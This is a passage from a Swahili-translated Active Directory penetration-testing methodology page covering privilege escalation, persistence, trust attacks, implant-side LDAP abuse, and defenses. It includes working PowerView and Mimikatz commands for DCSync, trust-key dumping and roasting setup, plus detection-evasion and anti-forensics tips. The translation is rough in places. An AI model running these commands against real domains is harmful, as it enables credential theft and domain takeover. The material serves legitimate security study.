Mtumiaji aliyekomprometwa anaweza kuwa na baadhi ya **ruhusa za kuvutia juu ya baadhi ya domain objects** ambazo zinaweza kukuruhusu **kusonga upande/kuinua** ruhusa baadaye.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Kugundua **Spool service inasikiliza** ndani ya domain kunaweza kutumiwa vibaya ili **kupata credentials mpya** na **kuinua ruhusa**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ikiwa **watumiaji wengine** wanapofikia **mashine iliyokomprometwa**, inawezekana **kukusanya credentials kutoka kwenye memory** na hata **kuingiza beacons kwenye michakato yao** kujifanya wao.\
Kawaida watumiaji watafikia mfumo kupitia RDP, kwa hivyo hapa kuna jinsi ya kufanya mashambulizi kadhaa juu ya RDP sessions za watu wengine:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **local Administrator password** kwenye kompyuta zilizounganishwa na domain, kuhakikisha inarandamwa, kuwa ya kipekee, na kubadilishwa mara kwa mara. Nywila hizi zinawekwa ndani ya Active Directory na ufikiaji unadhibitiwa kupitia ACLs kwa watumiaji walioidhinishwa pekee. Ukiwa na ruhusa za kutosha za kupata nywila hizi, inawezekana ku-pivot kwa kompyuta nyingine.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Kukusanya certificates** kutoka kwa mashine iliyokomprometwa kunaweza kuwa njia ya kuinua ruhusa ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ikiwa **templates zilizoathirika** zimewekwa, inawezekana kuzitumia vibaya kuinua ruhusa:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Mara tu unapopata **Domain Admin** au vizuri zaidi **Enterprise Admin** privileges, unaweza **kutoa** database ya domain: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Baadhi ya mbinu zilizojadiliwa hapo awali zinaweza kutumika kwa persistence.\
Kwa mfano unaweza:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Shambulio la **Silver Ticket** linaunda **Ticket Granting Service (TGS) ticket** halali kwa huduma maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya account ya PC**). Njia hii hutumika kupata **ruhusa za huduma**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Shambulio la **Golden Ticket** linahusisha mshambuliaji kupata **NTLM hash ya account ya krbtgt** ndani ya Active Directory (AD). Akaunti hii ni maalum kwa sababu inatumika kusaini TGTs zote, ambazo ni muhimu kwa uthibitishaji ndani ya mtandao wa AD.

Mara mshambuliaji anapopata hash hii, anaweza kuundua **TGTs** kwa akaunti yoyote watakayo (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizoforgwa kwa njia zinazoweza **kupitisha mitambo ya kawaida ya kugundua golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na vyeti vya akaunti au uwezo wa kuviomba** ni njia nzuri ya kudumu kwenye akaunti ya mtumiaji (hata akibadilisha password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Kutumia certificates pia kunawezekana kudumu kwa ruhusa za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Kituo cha **AdminSDHolder** ndani ya Active Directory kinahakikisha usalama wa **vikundi vyenye priviliage** (kama Domain Admins na Enterprise Admins) kwa kutumia Access Control List (ACL) ya kawaida kwenye vikundi hivi ili kuzuia mabadiliko yasiyoruhusiwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; ikiwa mshambuliaji atabadilisha ACL ya AdminSDHolder ili kumpa mtumiaji wa kawaida ufikiaji kamili, mtumiaji huyo atapata udhibiti mkubwa juu ya vikundi vyote vyenye privilage. Kipengele hiki cha usalama, kilichokusudiwa kuzuia, kinaweza kugeuka na kuruhusu ufikiaji usiofaa isipokuwa kimeangaliwa kwa karibu.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Katikati ya kila **Domain Controller (DC)**, kuna akaunti ya **local administrator**. Kwa kupata haki za admin kwenye mashine kama hii, hash ya local Administrator inaweza kutolewa kwa kutumia **mimikatz**. Baadaye, mabadiliko ya registry yanahitajika ili **kuruhusu matumizi ya nywila hii**, kuruhusu ufikiaji wa mbali kwa akaunti ya local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumpa** mtumiaji **ruhusa maalum** juu ya vitu maalum vya domain ambazo zitamruhusu mtumiaji **kuinua ruhusa baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** zinatumiwa kuhifadhi **ruhusa** ambazo **kitu** kina **juu ya** kitu kingine. Ikiwa unaweza kufanya **mabadiliko madogo** kwenye **security descriptor** ya kitu, unaweza kupata ruhusa za kuvutia juu ya kitu hicho bila ya kuwa mwanachama wa kundi lenye kivyake cha privilage.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Tumia darasa la kusaidia `dynamicObject` kuunda principals/GPOs/rekodi za DNS zenye muda mfupi na `entryTTL`/`msDS-Entry-Time-To-Die`; zinafuta wenyewe bila tombstones, zikifuta ushahidi wa LDAP huku zikiacha orphan SIDs, referensi za `gPLink` zilizovunjika, au majibu ya DNS yaliyohifadhiwa (mfano, uchafuzi wa AdminSDHolder ACE au `gPCFileSysPath`/AD-integrated DNS redirects zenye nia mbaya).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** kwenye memory ili kuweka **password ya ulimwengu mzima**, ikikupa ufikiaji kwa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda SSP yako mwenyewe ili **kukamata** kwa **clear text** **credentials** zinazotumika kufikia mashine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Inasajili **Domain Controller** mpya katika AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwa vitu vilivyobainishwa **bila** kuacha **logs** kuhusu **marekebisho**. Unahitaji DA privileges na kuwa ndani ya **root domain**.\
Kumbuka kwamba ikiwa utatumia data zisizo sahihi, logs mbaya zitajitokeza.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Hapo awali tulijadili jinsi ya kuinua ruhusa ukiwa na **ruhusa za kutosha kusoma LAPS passwords**. Hata hivyo, nywila hizi pia zinaweza kutumika kwa **kuweka persistence**.\
Angalia:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft inaona **Forest** kama mipaka ya usalama. Hii inamaanisha kuwa **kuvamia domain moja kunaweza kusababisha Forest yote kuvamiwa**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni mekanismo ya usalama inayomruhusu mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Inaunda muunganiko kati ya mifumo ya uthibitisho ya domains mbili, ikiruhusu uthibitisho kuhamia kwa urahisi. Wakati domains zinazoweka trust, zinabadilishana na kuhifadhi **vifunguo** maalum ndani ya **Domain Controllers (DCs)**, ambavyo ni muhimu kwa uaminifu wa trust.

Katika tukio la kawaida, mtumiaji anapotaka kufikia huduma katika **trusted domain**, lazima awasilishe ticket maalum inayojulikana kama **inter-realm TGT** kutoka kwa DC ya domain yao. TGT hii imefungwa kwa **kiyi** iliyoshirikiwa ambayo domains zote mbili zimekubali. Mtumiaji kisha anawasilisha TGT hii kwa **DC ya trusted domain** ili kupata ticket ya huduma (**TGS**). Baada ya DC ya trusted domain kuthibitisha inter-realm TGT kwa kutumia kifuani kinachoshirikiwa, itatoa TGS, ikimpa mtumiaji ufikiaji wa huduma.

**Hatua**:

1. Kompyuta ya **mteja** katika **Domain 1** inaanza mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)**.
2. DC1 hutoa TGT mpya ikiwa mteja athibitishwa kwa mafanikio.
3. Mteja kisha anaomba **inter-realm TGT** kutoka DC1, ambayo inahitajika kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT imefungwa kwa **trust key** inayoshirikiwa kati ya DC1 na DC2 kama sehemu ya trust ya mwelekeo wa pande mbili.
5. Mteja hupeleka inter-realm TGT kwa **Domain 2's Domain Controller (DC2)**.
6. DC2 inathibitisha inter-realm TGT kwa kutumia trust key yake iliyoshirikiwa na, ikiwa ni halali, inatoa **Ticket Granting Service (TGS)** kwa server huko Domain 2 ambayo mteja anataka kufikia.
7. Mwishowe, mteja huwasilisha TGS hii kwa server, ambayo imefungwa kwa hash ya account ya server, ili kupata ufikiaji wa huduma katika Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa ya njia 1 au ya njia 2**. Katika chaguo la njia 2, domains zote mbili zitaaminiana, lakini katika uhusiano wa **njiia 1** moja ya domains itakuwa **trusted** na nyingine itakuwa **trusting** domain. Katika kesi ya mwisho, **utakuwa na uwezo wa kufikia rasilimali ndani ya trusting domain kutoka kwenye trusted domain pekee**.

Ikiwa Domain A inamuaminisha Domain B, A ni trusting domain na B ni trusted. Zaidi gani, katika **Domain A**, hii itakuwa **Outbound trust**; na katika **Domain B**, hii itakuwa **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Hii ni mpangilio wa kawaida ndani ya forest sawa, ambapo domain mtoto mara moja ina two-way transitive trust na domain mzazi. Kwa vitendo, hii ina maana kwamba maombi ya uthibitisho yanaweza kuhamia kwa urahisi kati ya mzazi na mtoto.
- **Cross-link Trusts**: Zinatajwa kama "shortcut trusts," zinaundwa kati ya child domains ili kuharakisha mchakato wa referral. Katika forest ngumu, referrals za uthibitisho kwa kawaida lazima zisafiri hadi root ya forest kisha kushuka hadi domain lengwa. Kwa kuunda cross-links, safari inafupishwa, jambo ambalo ni muhimu hasa katika mazingira yaliyoenea kijiografia.
- **External Trusts**: Hizi zinawekwa kati ya domains tofauti, zisizohusiana na zina sifatika kuwa non-transitive. Kulingana na [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts ni muhimu kwa kufikia rasilimali katika domain nje ya forest ya sasa isiyounganishwa kwa forest trust. Usalama unaimarishwa kupitia SID filtering kwa external trusts.
- **Tree-root Trusts**: Trusts hizi haziajwi kwa zana kati ya forest root domain na tree root iliyoongezwa hivi karibuni. Ingawa hazikutokei mara kwa mara, tree-root trusts ni muhimu kwa kuongeza miti mpya ya domain kwenye forest, kuwaruhusu kuhifadhi jina la kipekee la domain na kuhakikisha transitivity ya pande mbili. Maelezo zaidi yanaweza kupatikana kwenye [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni two-way transitive trust kati ya forest root domains mbili, pia ikiteketeza SID filtering ili kuongeza hatua za usalama.
- **MIT Trusts**: Trusts hizi zinaanzishwa na Kerberos domains zisizo za Windows zinazofuata [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum kidogo na zinahudumia mazingira yanayohitaji ujumuishaji na mifumo ya Kerberos nje ya mazingira ya Windows.

#### Other differences in **trusting relationships**

- Uhusiano wa trust unaweza pia kuwa **transitive** (A trust B, B trust C, basi A trust C) au **non-transitive**.
- Uhusiano wa trust unaweza kuwekwa kama **bidirectional trust** (wakati wote wanamuaminiana) au kama **one-way trust** (mmoja tu anamwamini mwingine).

### Attack Path

1. **Fichua** uhusiano wa kuaminiana
2. Angalia kama kuna **security principal** (user/group/computer) anaye **pata** rasilimali za **domain nyingine**, labda kupitia viingilio vya ACE au kwa kuwa sehemu ya makundi ya domain nyingine. Tafuta **uhusiano跨域** (the trust ilianzishwa kwa ajili ya hili labda).
1. kerberoast katika kesi hii inaweza kuwa chaguo jingine.
3. **Kompromiti** akaunti ambazo zinaweza **kupitia** domains.

Wavamizi wanaoweza kufikia rasilimali katika domain nyingine kupitia njia tatu kuu:

- **Local Group Membership**: Principals wanaweza kuongezwa kwa makundi ya ndani kwenye mashine, kama kikundi cha “Administrators” kwenye server, wanapopewa udhibiti mkubwa juu ya mashine hiyo.
- **Foreign Domain Group Membership**: Principals pia wanaweza kuwa wanachama wa makundi ndani ya domain ya kigeni. Hata hivyo, ufanisi wa mbinu hii unategemea aina ya trust na wigo wa kundi.
- **Access Control Lists (ACLs)**: Principals wanaweza kutajwa katika **ACL**, hasa kama entities katika **ACEs** ndani ya **DACL**, kuwapatia ufikiaji wa rasilimali maalum. Kwa wale wanaotaka kuchimba zaidi kuhusu mechanics za ACLs, DACLs, na ACEs, whitepaper iliyoitwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni rasilimali isiyopimika.

### Find external users/groups with permissions

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals ndani ya domain. Hawa watakuwa user/group kutoka **an external domain/forest**.

Unaweza kuangalia hii kwa **Bloodhound** au kwa kutumia powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia zingine za kuorodhesha uaminifu wa domain:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **vifunguo 2 vinavyotumika kwa kuaminika**, kimoja kwa _Child --> Parent_ na kimoja kwa _Parent_ --> _Child_.\
> Unaweza kuona ile inayotumika na domain ya sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Panda hadhi kuwa Enterprise admin kwenye domain ya child/parent kwa kutumia vibaya trust kupitia SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration Naming Context (NC) inavyoweza kutumiwa ni muhimu. Configuration NC ni hazina kuu ya data za usanidi katika forest ya Active Directory (AD). Data hii inareplicwa hadi kwa kila Domain Controller (DC) ndani ya forest, na writable DCs zina nakala inayoweza kuandikwa ya Configuration NC. Ili kuizalisha, lazima uwe na **SYSTEM privileges kwenye DC**, ikiwezekana child DC.

**Unganisha GPO na site ya root DC**

Sites container ya Configuration NC ina taarifa kuhusu sites za kompyuta zote zilizojiunga na domain ndani ya AD forest. Kwa kufanya kazi ukiwa na SYSTEM privileges kwenye DC yoyote, mshambuliaji anaweza kuunganisha GPOs kwa root DC sites. Hatua hii ina uwezo wa kuathiri root domain kwa kubadilisha policies zinazotumika kwa sites hizi.

Kwa taarifa za kina, unaweza kusoma utafiti wa [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Mbinu ya kushambulia ni kulenga gMSA za kibali ndani ya domain. KDS Root key, muhimu kwa kuhesabu password za gMSA, imeshikiliwa ndani ya Configuration NC. Ukiwa na SYSTEM privileges kwenye DC yoyote, inawezekana kupata KDS Root key na kuhesabu password za gMSA yoyote ndani ya forest.

Uchambuzi wa kina na mwongozo hatua kwa hatua unaweza kupatikana katika:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti wa ziada wa nje: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Mbinu hii inahitaji subira, ukisubiri uundaji wa vitu vipya vya AD vyenye hadhi za juu. Ukiwa na SYSTEM privileges, mshambuliaji anaweza kubadilisha AD Schema ili kumpa mtumiaji yeyote udhibiti kamili juu ya all classes. Hii inaweza kusababisha ufikiaji usioidhinishwa na udhibiti wa vitu vipya vya AD.

Soma zaidi kwa [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Unyanyasaji wa ADCS ESC5 unalenga udhibiti wa vitu vya Public Key Infrastructure (PKI) ili kuunda certificate template inayoruhusu kuathentikisha kama mtumiaji yeyote ndani ya forest. Kwa kuwa vitu vya PKI viko katika Configuration NC, kuharibiwa kwa writable child DC kunaruhusu utekelezaji wa mashambulizi ya ESC5.

Taarifa zaidi zinaweza kusomwa katika [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Katika mazingira yasiyo na ADCS, mshambuliaji ana uwezo wa kusanidi vipengele vinavyohitajika, kama ilivyoelezwa katika [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika tukio hili **domain yako imeaminika** na domain ya nje ikikupa **idhini zisizojulikana** juu yake. Utahitaji kugundua **ni principals gani wa domain yako wana ufikiaji gani juu ya domain ya nje** kisha ujaribu ku-exploit:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domain ya Msitu wa Nje - Njia Moja (Kutoka)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika senario hii **your domain** inakuwa **trusting** baadhi ya **privileges** kwa principal kutoka **different domains**.

Hata hivyo, wakati **domain is trusted** na domain inayomwamini, domain iliyothibitishwa **creates a user** yenye **predictable name** ambayo hutumia kama **password the trusted password**. Hii ina maana kuwa inawezekana **access a user from the trusting domain to get inside the trusted one** ili kuifanyia enumeration na kujaribu kuinua privileges zaidi:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kushambulia domain iliyothibitishwa ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyotengenezwa katika **opposite direction** ya domain trust (ambayo si ya kawaida sana).

Njia nyingine ya kushambulia domain iliyothibitishwa ni kukaa kwenye mashine ambapo **user from the trusted domain can access** kuingia kwa njia ya **RDP**. Kisha, mshambuliaji anaweza kuingiza code kwenye mchakato wa **RDP session** na **access the origin domain of the victim** kutoka huko.\ Zaidi ya hayo, ikiwa **victim mounted his hard drive**, kutoka kwenye mchakato wa **RDP session** mshambuliaji anaweza kuhifadhi **backdoors** katika **startup folder of the hard drive**. Mbinu hii inaitwa **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Kupunguza matumizi mabaya ya domain trust

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia attribute ya SID history kwenye forest trusts inapunguzwa na SID Filtering, ambayo imewezeshwa kwa default kwenye inter-forest trusts zote. Hii inategemea dhana kwamba intra-forest trusts ni salama, ikiangalia forest badala ya domain kama mpaka wa usalama kama ilivyo kwa msimamo wa Microsoft.
- Hata hivyo, kuna tatizo: SID filtering inaweza kuvuruga applications na upatikanaji wa watumiaji, na kusababisha kuzimwa kwake mara kwa mara.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication inahakikisha kuwa users kutoka kwa misitu miwili hawathibitishwi kwa otomatiki. Badala yake, ruhusa maalum zinahitajika ili users waweze kufikia domains na servers ndani ya trusting domain au forest.
- Ni muhimu kutambua kuwa hatua hizi hazilindi dhidi ya unyonyaji wa writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse kutoka On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) inatekeleza upya primitives za bloodyAD-style LDAP kama x64 Beacon Object Files zinazoendeshwa kabisa ndani ya on-host implant (mfano, Adaptix C2). Operators hukusanya package kwa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, wanapakia `ldap.axs`, na kisha waina `ldap <subcommand>` kutoka beacon. Trafiki yote inatumia muktadha wa usalama wa current logon juu ya LDAP (389) na signing/sealing au LDAPS (636) na auto certificate trust, hivyo socks proxies au disk artifacts hazihitajiki.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, na `get-groupmembers` hutoa tafsiri za short names/OU paths hadi full DNs na kudump objects zinazofanana.
- `get-object`, `get-attribute`, na `get-domaininfo` huvuta arbitrary attributes (ikiwa ni pamoja na security descriptors) pamoja na forest/domain metadata kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, na `get-rbcd` zinaonyesha roasting candidates, delegation settings, na descriptors za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) moja kwa moja kutoka LDAP.
- `get-acl` na `get-writable --detailed` husoma DACL ili kuorodhesha trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), na inheritance, zikitoa malengo ya papo hapo kwa ajili ya ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) zinamruhusu mwendeshaji kuweka principals mpya au machine accounts popote haki za OU zipo. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` zinakamata malengo moja kwa moja mara tu haki za write-property zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` zinatafsiri WriteDACL/WriteOwner kwenye kitu chochote cha AD kuwa resets za password, udhibiti wa kuwa mwanachama wa group, au ruhusa za DCSync replication bila kuacha artifacts za PowerShell/ADSI. Nafasi za `remove-*` zinaharakisha kusafisha ACE zilizowekwa.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` huwa make user aliyekomeshwa Kerberoastable mara moja; `add-asreproastable` (UAC toggle) inamuweka kwa AS-REP roasting bila kugusa password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) zinarekebisha `msDS-AllowedToDelegateTo`, UAC flags, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, zikiruhusu njia za shambulio za constrained/unconstrained/RBCD na kuondoa haja ya remote PowerShell au RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inaingiza SIDs zenye hadhi ya juu kwenye SID history ya principal inayodhibitiwa (angalau [SID-History Injection](sid-history-injection.md)), ikitoa urithi wa ufikiaji kwa njia ya kimya kimya kabisa kupitia LDAP/LDAPS.
- `move-object` hubadilisha DN/OU ya computers au users, ikimruhusu mshambuliaji kuvuta assets ndani ya OUs ambako haki za delegation tayari zipo kabla ya kutumia `set-password`, `add-groupmember`, au `add-spn`.
- Amri za kuondoa zilizo na wigo mdogo (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) zinaruhusu rollback haraka baada ya mwendeshaji kuvuna credentials au persistence, kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Inapendekezwa kuwa Domain Admins waruhusiwe kuingia tu kwenye Domain Controllers, kuepuka matumizi yao kwenye hosts nyingine.
- **Service Account Privileges**: Services hazipaswi kuendeshwa kwa privileges za Domain Admin (DA) ili kudumisha usalama.
- **Temporal Privilege Limitation**: Kwa kazi zinazohitaji privileges za DA, muda wa ruhusa hizo unapaswa kupunguzwa. Hii inaweza kufanywa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Auditi Event IDs 2889/3074/3075 kisha utekeleze LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia jaribio za LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Kutekeleza deception kunahusisha kuweka mtego, kama users au computers za decoy, zenye sifa kama passwords ambazo hazihitimishi au zimewekwa kama Trusted for Delegation. Njia ya kina ni pamoja na kuunda users wenye haki maalum au kuagawa kwenye groups zenye hadhi ya juu.
- Mfano wa vitendo unahusisha zana kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Zaidi juu ya kutekeleza deception zinaweza kupatikana kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Viashiria vinavyoshuku vinajumuisha ObjectSID isiyo ya kawaida, logons zisizo za mara kwa mara, tarehe za uundaji, na idadi ndogo ya bad password attempts.
- **General Indicators**: Kuzilinganisha attributes za vitu vinavyoweza kuwa decoy na zile za vitu halisi kunaweza kufichua mabadiliko. Zana kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua deception hizi.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka session enumeration kwenye Domain Controllers ili kuzuia utambuzi wa ATA.
- **Ticket Impersonation**: Kutumia funguo za **aes** kwa ajili ya uundaji wa tiketi husaidia kuepuka utambuzi kwa kutoangusha hadi NTLM.
- **DCSync Attacks**: Kutekeleza kutoka kwenye non-Domain Controller ili kuepuka utambuzi wa ATA ni jambo linalopendekezwa, kwani utekelezaji wa moja kwa moja kutoka kwenye Domain Controller utasababisha alarms.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
